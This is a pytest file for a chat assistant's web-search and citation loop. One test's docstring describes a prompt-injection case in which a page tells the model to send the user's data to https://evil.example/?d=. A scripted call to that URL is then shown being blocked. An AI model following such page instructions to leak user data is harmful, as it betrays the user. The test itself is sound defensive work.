"""Chat answers that search the web and cite what they found (Phase 3 spec §6)."""
import time
from contextlib import aclosing

import httpx
import pytest
from fastapi.testclient import TestClient

from aethel.app import create_app
from aethel.chat.web_loop import ANSWER_NOW, MAX_TOOL_ROUNDS, WEB_NOTE, run_web_turn
from aethel.keys import KeyStore
from aethel.paths import db_path
from aethel.providers.base import ChatMessage, TextDelta, ToolCall, ToolCallsReady
from aethel.providers.router import RoleRouter
from aethel.services import build_services
from aethel.settings import SettingsService
from aethel.store.db import Database
from aethel.tools import web
from aethel.tools.base import Assessment, Tool, ToolContext, ToolResult
from tests.fakes import FakeLocal, ScriptedProvider, factory_from, tool_call

RESULTS = [{"title": "Rain in Paris", "href": "https://a.example/rain", "body": "April showers."},
           {"title": "Weather", "href": "https://b.example/w", "body": "Forecast."}]


@pytest.fixture(autouse=True)
def offline(monkeypatch):
    monkeypatch.setattr(web, "_search", lambda query, n: RESULTS)


def _client(provider, **patch):
    services = build_services(provider_factory=factory_from({"groq:g": provider}), local_llm=FakeLocal(up=False))
    services.keys.set_many({"groq": "k"})
    services.settings.update({"roles": {"chat": [{"provider": "groq", "model": "g"}]}, **patch})
    return TestClient(create_app(services)), services


def _conversation(client, web_on=True):
    conv = client.post("/api/conversations", json={}).json()
    if web_on is not None:
        client.patch(f"/api/conversations/{conv['id']}", json={"web": web_on})
    return conv


def _turn(ws, conv_id, text):
    ws.send_json({"type": "user_message", "conversation_id": conv_id, "text": text})
    events = []
    while True:
        ev = ws.receive_json()
        events.append(ev)
        if ev["type"] == "message_end":
            return events


def test_one_search_then_a_cited_answer():
    provider = ScriptedProvider([[tool_call("web_search", call_id="s1", query="rain in paris")],
                                 [TextDelta("It rains in April [1]."), TextDelta(" See also [2].")]])
    client, svc = _client(provider)
    with client:
        conv = _conversation(client)
        with client.websocket_connect("/ws/session") as ws:
            events = _turn(ws, conv["id"], "does it rain in Paris in April?")
    types = [e["type"] for e in events]
    assert types[0] == "message_start" and types[-1] == "message_end"
    assert types.index("tool_activity") < types.index("token") < types.index("sources") < types.index("message_end")
    act = next(e for e in events if e["type"] == "tool_activity")
    assert (act["kind"], act["label"], act["task_id"]) == ("search", 'Searching "rain in paris"', None)
    sources = next(e for e in events if e["type"] == "sources")
    assert sources["sources"] == [{"n": 1, "title": "Rain in Paris", "url": "https://a.example/rain"},
                                  {"n": 2, "title": "Weather", "url": "https://b.example/w"}]
    reply = svc.messages.list(conv["id"])[-1]
    assert reply.content == "It rains in April [1]. See also [2]." and reply.meta["sources"] == sources["sources"]
    # what the model saw: the tools, the note about citing, and the results wrapped as data
    assert {"web_search", "web_read"} <= set(provider.tools_seen[0])
    assert WEB_NOTE in provider.calls[0][0].content
    second = provider.calls[1]
    assert second[-2].role == "assistant" and second[-2].tool_calls[0].name == "web_search"
    assert second[-1].role == "tool" and second[-1].content.startswith('<untrusted source="web_search">')
    assert "[1] Rain in Paris — https://a.example/rain" in second[-1].content


def test_after_three_rounds_of_tools_the_model_is_made_to_answer():
    calls = [[tool_call("web_search", call_id=f"s{i}", query=f"q{i}")] for i in range(MAX_TOOL_ROUNDS)]
    provider = ScriptedProvider([*calls, [TextDelta("Here is what I found [1].")]])
    client, svc = _client(provider)
    with client:
        conv = _conversation(client)
        with client.websocket_connect("/ws/session") as ws:
            events = _turn(ws, conv["id"], "research this")
    assert len(provider.tools_seen) == MAX_TOOL_ROUNDS + 1
    assert provider.tools_seen[-1] == [] and all(provider.tools_seen[:-1])        # the last call has no tools
    assert provider.calls[-1][-1] == ChatMessage("user", ANSWER_NOW)
    assert svc.messages.list(conv["id"])[-1].content == "Here is what I found [1]."
    assert [e["type"] for e in events].count("tool_activity") == MAX_TOOL_ROUNDS


def test_without_the_web_there_are_no_tools_and_no_note():
    provider = ScriptedProvider([[TextDelta("hello")]])
    client, svc = _client(provider)                       # Settings → internet is off, the conversation follows it
    with client:
        conv = _conversation(client, web_on=None)
        with client.websocket_connect("/ws/session") as ws:
            events = _turn(ws, conv["id"], "hi")
    assert provider.tools_seen == [[]] and WEB_NOTE not in provider.calls[0][0].content
    assert "tool_activity" not in [e["type"] for e in events] and "sources" not in [e["type"] for e in events]
    assert "sources" not in svc.messages.list(conv["id"])[-1].meta


def test_the_global_switch_turns_it_on_and_the_conversation_can_turn_it_off():
    provider = ScriptedProvider([[TextDelta("a")], [TextDelta("b")]])
    client, _ = _client(provider, internet=True)
    with client:
        followed = _conversation(client, web_on=None)
        off = _conversation(client, web_on=False)
        with client.websocket_connect("/ws/session") as ws:
            _turn(ws, followed["id"], "one")
            _turn(ws, off["id"], "two")
    assert "web_search" in provider.tools_seen[0] and provider.tools_seen[1] == []


def test_the_web_tools_have_their_own_client_with_no_proxies_and_no_shared_cookies():
    client, svc = _client(ScriptedProvider([]))
    with client:
        assert svc.web_http is not svc.http_client                        # not the providers' client
        assert svc.web_http.trust_env is False and svc.web_http.follow_redirects is False


def test_private_mode_never_offers_web_tools():
    client, svc = _client(ScriptedProvider([]), internet=True, private_mode=True)
    with client:
        conv = svc.conversations.create()
        svc.conversations.set_web(conv.id, True)               # the conversation says yes; private mode says no
        assert svc.chat._web_tools_for(svc.conversations.get(conv.id)) == []
        svc.settings.update({"private_mode": False})
        assert [t.name for t in svc.chat._web_tools_for(svc.conversations.get(conv.id))] == ["web_search", "web_read"]


def test_a_malformed_call_is_reported_and_a_second_one_ends_the_loop():
    bad = ToolCallsReady([ToolCall(id="b", name="web_search", arguments="{not json")])
    provider = ScriptedProvider([[bad], [bad], [TextDelta("I'll answer from what I know.")]])
    client, svc = _client(provider)
    with client:
        conv = _conversation(client)
        with client.websocket_connect("/ws/session") as ws:
            events = _turn(ws, conv["id"], "search please")
    told = next(m.content for m in provider.calls[1] if m.role == "tool")
    assert told.startswith("Error: the arguments for web_search were not a JSON object")
    assert provider.tools_seen[1] and provider.tools_seen[2] == []  # the second bad round: answer with no tools
    assert svc.messages.list(conv["id"])[-1].content == "I'll answer from what I know."
    assert events[-1]["status"] == "complete"


def test_stopping_while_a_tool_runs_keeps_the_text_so_far(monkeypatch):
    monkeypatch.setattr(web, "_search", lambda q, n: time.sleep(1.5) or RESULTS)
    provider = ScriptedProvider([[TextDelta("Let me look. "), tool_call("web_search", query="slow")]])
    client, svc = _client(provider)
    with client:
        conv = _conversation(client)
        with client.websocket_connect("/ws/session") as ws:
            ws.send_json({"type": "user_message", "conversation_id": conv["id"], "text": "look it up"})
            while ws.receive_json()["type"] != "tool_activity":
                pass
            message_id = svc.messages.list(conv["id"])[-1].id
            ws.send_json({"type": "stop_generation", "message_id": message_id})
            end = ws.receive_json()
            while end["type"] != "message_end":
                end = ws.receive_json()
    assert end["status"] == "stopped"
    last = svc.messages.list(conv["id"])[-1]
    assert (last.status, last.content) == ("stopped", "Let me look. ")


def _recording_web_tools():
    """A fake search that finds one page, and a fake reader that records what it was asked to open."""
    opened = []

    async def search(args, ctx):
        ctx.sources.add("https://ok.example/p", "P")
        return ToolResult(True, "[1] P — https://ok.example/p", untrusted=True)

    async def read(args, ctx):
        opened.append(args["url"])
        return ToolResult(True, "page text", untrusted=True)

    allow = lambda a: Assessment("allow", "", "x")  # noqa: E731
    return opened, [Tool("web_search", "s", {"type": "object"}, "read", search, allow, toolgroup="web"),
                    Tool("web_read", "r", {"type": "object"}, "read", read, allow, toolgroup="web")]


@pytest.mark.anyio
async def test_once_outside_content_has_been_read_only_known_addresses_can_be_opened():
    """A page can tell the model to fetch https://evil.example/?d=<the user's data>. Chat has no approval step, so
    after the first results only addresses from a search, or the user's own, are opened."""
    opened, tools = _recording_web_tools()
    provider = ScriptedProvider([[tool_call("web_read", call_id="a", url="https://first.example/")],        # nothing read yet
                                 [tool_call("web_search", call_id="b", query="x")],                          # taints
                                 [tool_call("web_read", call_id="c", url="https://evil.example/?d=secret")],
                                 [tool_call("web_read", call_id="d", url="https://ok.example/p")],
                                 [TextDelta("done")]])
    db, router = _router(provider)
    sources = web.SourceList()
    async with aclosing(run_web_turn(router=router, prompt=[ChatMessage("user", "go")], tools=tools, ctx=ToolContext(task_id=None),
                                     sources=sources, publish=_nothing, message_id="m", on_switch=_nothing,
                                     budget=100_000)) as turn:
        [t async for t in turn]
    told = [m.content for m in provider.calls[-1] if m.role == "tool"]
    assert opened == ["https://first.example/"]                    # the evil address was never fetched
    assert any(t.startswith("Error: I can only open pages that came up in a search") for t in told)
    db.close()

    # ...and a listed address, or one the user wrote, is fine even after that
    opened, tools = _recording_web_tools()
    provider = ScriptedProvider([[tool_call("web_search", call_id="b", query="x")],
                                 [tool_call("web_read", call_id="d", url="https://ok.example/p")],
                                 [tool_call("web_read", call_id="e", url="https://mine.example/page")],
                                 [TextDelta("done")]])
    db, router = _router(provider)
    sources = web.SourceList()
    sources.seed("please read https://mine.example/page for me")
    async with aclosing(run_web_turn(router=router, prompt=[ChatMessage("user", "go")], tools=tools, ctx=ToolContext(task_id=None),
                                     sources=sources, publish=_nothing, message_id="m", on_switch=_nothing,
                                     budget=100_000)) as turn:
        [t async for t in turn]
    assert opened == ["https://ok.example/p", "https://mine.example/page"]
    db.close()


@pytest.mark.anyio
async def test_a_model_written_address_that_wont_parse_does_not_end_the_reply():
    provider = ScriptedProvider([[tool_call("web_read", call_id="a", url="http://[abc/x")], [TextDelta("Sorry, that link is broken.")]])
    db, router = _router(provider)
    published = []

    async def publish(ev):
        published.append(ev)

    tools = web.web_tools(lambda ctx: ctx.sources, httpx.AsyncClient())
    async with aclosing(run_web_turn(router=router, prompt=[ChatMessage("user", "go")], tools=tools, ctx=ToolContext(task_id=None),
                                     sources=web.SourceList(), publish=publish, message_id="m", on_switch=_nothing,
                                     budget=100_000)) as turn:
        text = [t async for t in turn]
    assert "".join(text) == "Sorry, that link is broken."
    assert [e.label for e in published] == ["Reading a page"]
    assert "can't open that address" in next(m.content for m in provider.calls[1] if m.role == "tool")
    db.close()


def test_an_address_the_user_pastes_in_chat_can_be_read_after_a_search(monkeypatch):
    opened, tools = _recording_web_tools()
    provider = ScriptedProvider([[tool_call("web_search", call_id="a", query="x")],
                                 [tool_call("web_read", call_id="b", url="https://mine.example/page")],
                                 [tool_call("web_read", call_id="c", url="https://evil.example/")],
                                 [TextDelta("done")]])
    client, svc = _client(provider)
    with client:
        for name in ("web_search", "web_read"):
            svc.registry.unregister(name)
        for t in tools:
            svc.registry.register(t)
        conv = _conversation(client)
        with client.websocket_connect("/ws/session") as ws:
            _turn(ws, conv["id"], "look at https://mine.example/page and tell me what it says")
    assert opened == ["https://mine.example/page"]


# ---- the loop on its own ---------------------------------------------------------------------------------
def _big_tool(name="web_read", size=3000):
    async def run(args, ctx):
        return ToolResult(True, f"[{args['i']}] page " + "x" * size, untrusted=True)

    return Tool(name, "Reads.", {"type": "object"}, "read", run, lambda a: Assessment("allow", "", "x"))


def _router(provider):
    db = Database(db_path())
    settings = SettingsService(db)
    settings.update({"roles": {"chat": [{"provider": "groq", "model": "g"}]}})
    keys = KeyStore()
    keys.set_many({"groq": "k"})
    return db, RoleRouter(settings=settings, keys=keys, local=FakeLocal(),
                          factory=factory_from({"groq:g": provider}))


async def _nothing(*a, **k):
    pass


@pytest.mark.anyio
async def test_old_results_make_room_when_the_prompt_would_overflow_but_the_newest_stays():
    provider = ScriptedProvider([[tool_call("web_read", call_id="r1", url="https://a.example/1", i=1)],
                                 [tool_call("web_read", call_id="r2", url="https://a.example/2", i=2)],
                                 [TextDelta("done")]])
    db, router = _router(provider)
    published = []

    async def publish(ev):
        published.append(ev)

    sources = web.SourceList()
    sources.seed("read https://a.example/1 and https://a.example/2")  # both are the user's own addresses
    async with aclosing(run_web_turn(
            router=router, prompt=[ChatMessage("system", "s"), ChatMessage("user", "read both")], tools=[_big_tool()],
            ctx=ToolContext(task_id=None), sources=sources, publish=publish, message_id="m1",
            on_switch=_nothing, budget=1200)) as turn:
        text = [t async for t in turn]
    assert "".join(text) == "done"
    tools = [m.content for m in provider.calls[-1] if m.role == "tool"]
    assert tools[0] == "[web_read of https://a.example/1: left out to fit; call it again if you need it]"
    assert tools[1].startswith('<untrusted source="web_read">') and "[2] page" in tools[1]   # the newest is kept whole
    assert "step" not in tools[0].lower()                                                    # stubs never cite step numbers
    assert [(e.kind, e.label) for e in published] == [("read", "Reading a.example")] * 2
    db.close()


@pytest.mark.anyio
async def test_a_failed_tool_call_is_not_an_observation_that_can_be_dropped():
    async def run(args, ctx):
        return ToolResult(False, "That page returned 404." + "y" * 3000)

    flaky = Tool("web_read", "Reads.", {"type": "object"}, "read", run, lambda a: Assessment("allow", "", "x"))
    provider = ScriptedProvider([[tool_call("web_read", call_id="r1", url="https://a.example/1")],
                                 [tool_call("web_read", call_id="r2", url="https://a.example/2")], [TextDelta("ok")]])
    db, router = _router(provider)
    async with aclosing(run_web_turn(router=router, prompt=[ChatMessage("user", "go")], tools=[flaky],
                                     ctx=ToolContext(task_id=None), sources=web.SourceList(), publish=_nothing,
                                     message_id="m", on_switch=_nothing, budget=800)) as turn:
        [t async for t in turn]
    errors = [m.content for m in provider.calls[-1] if m.role == "tool"]
    assert all("left out to fit" not in e for e in errors)   # an error is never masked as if it were a real page
    db.close()
